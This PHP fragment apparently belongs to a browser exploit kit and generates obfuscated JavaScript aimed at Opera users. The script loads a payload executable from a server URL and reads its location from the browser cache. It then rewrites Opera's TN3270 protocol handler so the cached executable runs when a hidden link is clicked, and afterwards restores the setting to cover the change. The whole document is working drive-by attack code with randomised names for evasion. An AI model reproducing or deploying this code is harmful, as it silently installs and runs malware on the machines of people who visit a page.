<?php 
if( $browser == "op" ) 
{
    $randVar = $GLOBALS["cpFunctions"]->CreateArrayString(rand(10, 30), "100");
    $strUrl = $GLOBALS["cpXplHelper"]->GetURL("other", $browser, $os, "TN3270");
    $exploitName = "opera";
    $functionName = $ExploitFunctions[9];
    $eArray[] = "\r\n\tfunction " . $functionName . "(){\r\n\t\t" . $randVar[0] . " = document.createElement('iframe');\r\n\t\t" . $randVar[0] . ".src = 'about:blank';\r\n\t\t" . $randVar[0] . ".setAttribute('id', '" . $randVar[1] . "');\r\n\t\t" . $randVar[0] . ".setAttribute('style', 'display:none');\r\n\t\tdocument.appendChild(" . $randVar[0] . ");\r\n\t\t" . $randVar[1] . ".eval\r\n\t\t\t(\"" . $randVar[2] . " = document.createElement('iframe');\\\r\n\t\t\t" . $randVar[2] . ".setAttribute('id', '" . $randVar[8] . "');\\\r\n\t\t\t" . $randVar[2] . ".src = 'opera:config';\\\r\n\t\t\tdocument.appendChild(" . $randVar[2] . ");\\\r\n\t\t\t" . $randVar[3] . " = document.createElement('script');\\\r\n\t\t\t" . $randVar[4] . " = document.createElement('iframe');\\\r\n\t\t\t" . $randVar[3] . ".src = '" . $strUrl . "';\\\r\n\t\t\t" . $randVar[3] . ".onload = function ()\\\r\n\t\t\t{\\\r\n\t\t\t\t" . $randVar[4] . ".src = 'opera:cache';\\\r\n\t\t\t\t" . $randVar[4] . ".onload = function ()\\\r\n\t\t\t\t{\\\r\n\t\t\t\t\t" . $randVar[5] . " = " . $randVar[4] . ".contentDocument.childNodes[0].innerHTML.toUpperCase();\\\r\n\t\t\t\t\tvar " . $randVar[6] . " = new RegExp('(OPR\\\\\\\\w{5}.EXE)</TD>\\\\\\\\s*<TD>\\\\\\\\d+</TD>\\\\\\\\s*<TD><A HREF=\\\"'+" . $randVar[3] . ".src.toUpperCase(), '');\\\r\n\t\t\t\t\t" . $randVar[7] . " = " . $randVar[5] . ".match(" . $randVar[6] . ");\\\r\n\t\t\t\t\t" . $randVar[8] . ".eval\\\r\n\t\t\t\t\t(\\\"\\\r\n\t\t\t\t\topera.setPreference('Network','TN3270 App',opera.getPreference('User Prefs','Cache Directory4')+parent." . $randVar[7] . "[1]);\\\r\n\t\t\t\t\t" . $randVar[9] . " = document.createElement('a');\\\r\n\t\t\t\t\t" . $randVar[9] . ".setAttribute('href', 'tn3270://nothing');\\\r\n\t\t\t\t\t" . $randVar[9] . ".click();\\\r\n\t\t\t\t\tsetTimeout(function () {opera.setPreference('Network','TN3270 App','telnet.exe')},1000);\\\r\n\t\t\t\t\t\\\");\\\r\n\t\t\t\t};\\\r\n\t\t\t\tdocument.appendChild(" . $randVar[4] . ");\\\r\n\t\t\t};\\\r\n\t\t\tdocument.appendChild(" . $randVar[3] . ");\");\r\n\t\t\t{next}\r\n\t}";
}


